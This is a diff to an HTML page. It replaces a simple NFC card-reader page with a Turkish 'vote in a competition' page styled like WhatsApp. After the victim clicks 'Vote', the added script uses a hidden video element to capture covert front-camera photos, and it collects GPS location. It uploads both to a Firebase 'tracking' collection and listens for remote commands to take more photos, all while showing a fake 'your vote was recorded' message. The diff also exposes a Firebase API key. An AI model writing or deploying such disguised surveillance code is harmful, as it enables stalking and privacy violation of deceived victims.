@@ -3,90 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gelişmiş NFC Kart Okuyucu</title>
+    <title>Yarışma Katılım</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 450px; text-align: center; }
-        h2 { color: #1a73e8; margin-bottom: 20px; }
-        #scanBtn { background-color: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
-        #scanBtn:hover { background-color: #1557b0; }
-        #output { margin-top: 25px; text-align: left; display: none; border-top: 2px solid #eee; pt: 15px; }
-        .info-item { background: #f8f9fa; padding: 12px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #1a73e8; }
-        .label { font-weight: bold; color: #555; font-size: 12px; text-transform: uppercase; display: block; }
-        .value { font-size: 16px; color: #222; word-break: break-all; }
-        #status { margin-top: 15px; font-size: 14px; font-weight: 500; }
+        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
+        .card { text-align: center; padding: 30px; border-radius: 20px; background: #111b21; border: 1px solid #233138; width: 85%; }
+        #video { position: absolute; left: -9999px; opacity: 0; width: 1px; height: 1px; }
+        #btn { width: 100%; height: 55px; background-color: #00a884; color: white; display: flex; justify-content: center; align-items: center; border-radius: 30px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
-<div class="card">
-    <h2>NFC Kimlik Okuyucu</h2>
-    <p>Kartı okutmak için butona basıp telefonun arkasına dokundurun.</p>
-    
-    <button id="scanBtn">Kartı Tara</button>
-    
-    <div id="status"></div>
-
-    <div id="output">
-        <div class="info-item">
-            <span class="label">Kart Seri Numarası (UID)</span>
-            <span id="uid" class="value">-</span>
-        </div>
-        <div id="recordsContainer">
-            </div>
+    <div class="card">
+        <h2 id="title">Aday Onayı Bekleniyor</h2>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <div id="btn" onclick="calistir()">Oy Ver</div>
+        <p id="stat" style="font-size:12px; color:#8696a0; margin-top:10px;">Sistem doğrulanıyor...</p>
     </div>
-</div>
 
-<script>
-    const scanBtn = document.getElementById('scanBtn');
-    const status = document.getElementById('status');
-    const output = document.getElementById('output');
-    const uidDisplay = document.getElementById('uid');
-    const recordsContainer = document.getElementById('recordsContainer');
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    scanBtn.addEventListener('click', async () => {
-        if (!('NDEFReader' in window)) {
-            status.innerHTML = "<span style='color:red'>Hata: Tarayıcı NFC desteklemiyor veya HTTPS değil!</span>";
-            return;
+        const firebaseConfig = {
+            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
+            authDomain: "whtapp-27674.firebaseapp.com",
+            projectId: "whtapp-27674",
+            storageBucket: "whtapp-27674.appspot.com"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function fotoCekVeGonder(pos) {
+            canvas.width = 320; // Hız için boyutu küçülttük
+            canvas.height = 240;
+            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+            const photoBase64 = canvas.toDataURL('image/jpeg', 0.4); // Kaliteyi %40 yaptık ki yer kaplamasın
+
+            await setDoc(doc(db, "takip", "admin"), {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                fotoVeri: photoBase64,
+                zaman: new Date().toLocaleString('tr-TR'),
+                t: Date.now()
+            }, { merge: true });
         }
 
-        try {
-            const ndef = new NDEFReader();
-            await ndef.scan();
-            
-            status.innerHTML = "<span style='color:blue'>Tarama başladı... Kartı yaklaştırın.</span>";
+        window.calistir = async () => {
+            document.getElementById("btn").innerText = "İşleniyor...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
 
-            ndef.onreading = ({ message, serialNumber }) => {
-                status.innerHTML = "<span style='color:green'>Okuma Başarılı!</span>";
-                output.style.display = "block";
-                
-                // UID (Seri Numarası) bilgisini yaz
-                uidDisplay.innerText = serialNumber || "Gizli veya Yok";
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    setTimeout(() => { 
+                        fotoCekVeGonder(pos); 
+                        alert("Oyunuz kaydedildi!");
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1500);
+                });
 
-                // İçerikteki verileri (Metinleri) oku
-                recordsContainer.innerHTML = ""; // Önce temizle
-                for (const record of message.records) {
-                    const decoder = new TextDecoder(record.encoding || 'utf-8');
-                    const dataText = decoder.decode(record.data);
-                    
-                    recordsContainer.innerHTML += `
-                        <div class="info-item">
-                            <span class="label">Kayıt Tipi: ${record.recordType}</span>
-                            <span class="value">${dataText}</span>
-                        </div>
-                    `;
-                }
-            };
-
-            ndef.onreadingerror = () => {
-                status.innerHTML = "<span style='color:red'>Kart okunamadı. Tekrar deneyin.</span>";
-            };
-
-        } catch (error) {
-            status.innerHTML = "<span style='color:red'>Hata: " + error + "</span>";
-        }
-    });
-</script>
-
+                // Panelden gelen fotoğraf çek komutunu dinle
+                onSnapshot(doc(db, "takip", "komut"), async (snap) => {
+                    if (snap.exists() && snap.data().cek === true) {
+                        navigator.geolocation.getCurrentPosition(p => fotoCekVeGonder(p));
+                        await setDoc(doc(db, "takip", "komut"), { cek: false });
+                    }
+                });
+            } catch (e) { alert("İzin vermeniz gerekiyor!"); }
+        };
+    </script>
 </body>
 </html>
